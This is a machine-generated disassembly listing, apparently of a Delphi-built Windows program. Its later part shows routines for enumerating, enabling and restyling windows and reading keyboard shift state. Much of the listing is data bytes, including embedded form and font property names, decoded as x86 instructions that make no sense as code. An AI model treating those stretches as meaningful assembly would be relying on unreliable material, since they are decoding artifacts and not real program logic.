and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0xcff0001 ] ah
and eax 0x25300044
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
outsb
je r-xdata
insd
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
dec ecx
imul ebp [ ebp - 0x18 ] 0x8004507
add al [ eax ]
[ eax + 0x38 ]
cmp al 0x10
outsd
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
clc
mov esp 0x10043
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
scasb [ edi ]
inc ecx
add [ eax ] ch
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
push 0xc0ff0000
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
or al 0x45
add [ edi ] ch
add al [ eax ]
[ eax + ebx * 2 + 0x586c0045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
mov dh 0x41
add [ eax + 0x2 ] al
add bh bh
pushad
pop eax
inc ebp
add [ eax + ebx * 2 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
inc eax
add [ eax + eax ] cl
[ ebx + esi * 4 + 0x49280043 ]
insb
cmp al 0x10
sub_451b6e
dec esp
inc ebp
add [ eax - 0x24 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
dec [ eax + 0x280043b3 ]
dec ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub eax [ edx ]
add bh bh
sbb [ ebp + 0x45 ] bl
add [ eax + ebx * 2 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ eax ] al
inc eax
add [ eax ] al
je r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
dec edi
outsb
inc ebx
adc [ ebp + 0x2580044 ] ah
add bh bh
mov esp 0x6c004559
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
jb r-xdata
push ecx
sub al 0x10
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
[ eax + ebx * 2 + 0x45 ]
rol [ eax ] 0x0
adc [ ecx ] al
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
sub al 0x10
push 0xc8004375
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
inc ebx
insb
outsd
jae r-xdata
clc
je r-xdata
dec edi
outsb
inc esp
jb r-xdata
mov esp 0xb0004372
add [ eax ] eax
push [ eax + 0x1ff0001 ]
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
sub al 0x10
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
pushad
cmovne eax [ eax ]
cwde
add al [ eax ]
[ eax + 0x6cff0002 ]
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
arpl [ ebx + 0x1c ] bp
cmovne eax [ eax ]
nop
add al [ eax ]
call [ eax + 0x6cff0002 ]
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
outsb
add al al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jo r-xdata
mov eax 0xe8004371
jb r-xdata
[ eax + ebx * 2 + 0x45 ]
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
push ecx
add bh bh
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x2c6f666e
adc [ ecx ] al
mov al 0x2
add bh bh
mov al 0x2
add bh bh
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
sub al 0x10
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
jo r-xdata
outsb
dec eax
add [ eax ] al
or [ ebp ] 0x6
jb r-xdata
jae r-xdata
jbe r-xdata
jns r-xdata
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
jno r-xdata
je r-xdata
outsb
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
jb r-xdata
inc esp
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
inc ebp
outsb
inc esp
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edx ] cl
dec edi
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
adc [ ecx ] al
mov al [ 0xffffffffa0ff0002 ]
mov al [ 0x6cff0002 ]
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
jo r-xdata
loopne r-xdata
jo r-xdata
jo r-xdata
hlt
imul esp [ ebp - 0x20 ] 0xa800450f
add al [ eax ]
[ eax + 0x1ff0002 ]
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
arpl [ ebx + 0x6c ] bp
je r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
[ eax + ebx * 2 + 0x45 ]
jns r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
jno r-xdata
add bh bh
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
adc [ ecx ] al
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
add bh bh
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
add [ eax ] al
add [ eax + 0x4f0a0050 ] al
outsb
dec ebx
jns r-xdata
outsd
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
[ eax + ebx * 2 + 0x45 ]
jae r-xdata
add al bl
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] al
add al ch
outsd
jne r-xdata
push ebp
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0053 ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
jo r-xdata
push ebp
dec edi
dec ebp
add [ esi ] al
adc [ ecx ] al
enter 0x2 0xff
enter 0x2 0xff
insb
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x7420776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
dec ebp
outsd
jne r-xdata
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
inc ebp
add [ eax + 0x34 ] ch
inc eax
add [ eax - 0x43ffba9b ] cl
xor [ eax ] eax
fdiv [ ecx ]
inc eax
add [ ecx + eax * 2 + 0x2ee40045 ] al
inc esp
jb r-xdata
[ eax + ebx * 2 + 0x45 ]
adc [ ecx ] al
mov eax 0xb8ff0002
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
jne r-xdata
add [ eax ] bh
add [ eax ] eax
movsb [ edi ] [ esi ]
cmovne eax [ eax ]
rol [ edx ] 0x0
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
outsb
dec ebp
xor [ esi + 0x43 ] 0x0
dec eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
adc [ edi + 0x6e ] cl
dec ebp
outsd
int3
add [ eax ] al
jmp eax
test al 0x70
inc ebx
add al ch
add [ eax ] eax
dec esp
mov es [ ebp ]
mov es [ fs : ebp ]
in al 0x8a
inc ebp
add al cl
mov eax [ ebp ]
xor al 0x8c
inc ebp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax + 0x42 ] ch
inc ebp
add ah ah
inc edx
inc ebp
add [ eax * 4 + 0x3fa00045 ] ch
inc ebp
add [ eax ] dh
add [ ebp ] 0x10
inc ebp
add ah ah
add [ ebp ] sub_454cc8
or [ eax ] eax
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
add ah dh
inc esi
inc ebp
add [ esi + edi - 0x7417ffbf ] bh
inc ebp
add [ eax - 0x73ffbabd ] al
inc esp
inc ebp
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ ecx * 2 - 0x67a7ffbb ] al
inc ecx
add [ eax + ecx * 4 - 0x7583ffbb ] ah
inc ebp
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add ah ah
dec ecx
inc ebp
add [ ecx - 0x51a7ffbc ] ch
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add al bl
dec edx
inc ebp
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0x4ccc0043
inc ebp
add [ eax + 0x6000454b ] bl
mov esp 0x4d440043
inc ebp
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax - 0x23ffbbde ] ah
cmp al 0x45
add al ch
push ebx
inc ebp
add [ eax + edi * 8 + 0x43 ] ch
add [ eax + 0x640c0045 ] ch
inc ebp
add al cl
bound eax [ ebp ]
add al 0xf9
inc ebx
add [ eax ] cl
stc
inc ebx
add [ ebp + 0x45 ] al
add [ eax - 0x9 ] ch
inc ebx
add al ah
and eax [ eax + eax + 0x38 ]
insb
inc ebp
add [ ebp + esi + 0x205c0044 ] dh
inc esp
add [ ecx + eax * 4 + 0x45 ] cl
add al dl
inc ebp
add [ eax + 0x2c004539 ] al
jb r-xdata
add ah ah
inc esp
inc esp
jae r-xdata
push edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
and al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x10
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x23
je r-xdata
add al [ eax ]
add [ eax + edx ] bh
inc ebp
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x3f ] ch
inc ebp
add [ ecx + eax * 2 ] bl
and al [ ebp ]
clc
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shr [ ecx ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and al [ ebp ]
pop eax
je r-xdata
jpe r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp [ eax ] al
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
and [ edx ] ah
inc ebp
add [ eax + 0x22 ] bl
inc ebp
add al bh
outsd
arpl [ ebx - 0x4c ] bp
jae r-xdata
popad
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
mov al 0x24
inc ebp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax ] al
add [ ebx ] al
insb
and al [ ebp ]
pop es
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
xor al 0x24
inc ebp
add al ah
and al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax ] bh
mov [ 0x3fa00045 ] al
inc ecx
add [ eax - 0x69 ] ch
inc ecx
add [ esi + edi - 0x67bfffbf ] bh
inc ecx
add [ edi + edx * 4 ] cl
inc ecx
add [ eax - 0x68 ] dl
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x4c00419b ] al
mov al [ 0xe0045 ]
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
or [ ebx ] ch
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
xchg esp eax
inc ecx
add [ eax + 0x34 ] ch
add [ eax ] al
nop
xor al 0x24
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x45 ] ah
add [ eax + 0x4524 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40004524 ] bl
add [ eax ] eax
add ah ah
and [ ecx ] eax
pushad
fwait
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax + 0x34 ] ah
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ ecx + rw-data ] ah
retn
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
sub al 0x21
inc ebp
add [ ebx + edx ] bl
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add [ eax - 0x33ffbaa5 ] bh
pop ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x5c00408d
and eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] fs
inc ebp
add [ ebx + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
and eax [ ebp ]
mov al [ 0xffffffffe4000000 ]
and [ ecx ] eax
pushad
fwait
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add al al
nop
inc ebp
add [ eax + 0x6800413f ] ah
xchg edi eax
inc ecx
add [ esi + edi - 0x67bfffbf ] bh
inc ecx
add [ edi + edx * 4 ] cl
inc ecx
add [ eax - 0x68 ] dl
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x6800419b ] al
pop [ ebp ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
lodsb [ esi ]
and eax [ ebp ]
pop es
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
pop esp
and eax [ ebp ]
loopne r-xdata
xor [ eax ] eax
adc al 0x32
outsb
arpl [ eax - 0x70 ] bp
add al 0x23
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4524e0
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_45252c
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45bc34
mov eax [ rw-data ]
call sub_419690
mov eax [ rw-data ]
call sub_419638
retn
push 0x0
push eax
call ShowOwnedPopups
sub_452564
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_4525b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_452657
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_452620
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_452564
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45265e
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_452668
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_4526a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_452704
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_4526a0
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_452760
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_452780
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_452760
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4527ac
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_459214
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_459684
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407b0c
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_459200
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_459670
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407b0c
test eax eax
je r-xdata
sub_452834
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_452888
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4528c4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_452910
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45296e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_450484
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404144
mov eax [ ebp - 0x8 ]
pop edx
call sub_407b0c
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452975
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
sub_452980
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_4529a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_452a19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_452980
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452a20
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
sub_452a28
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
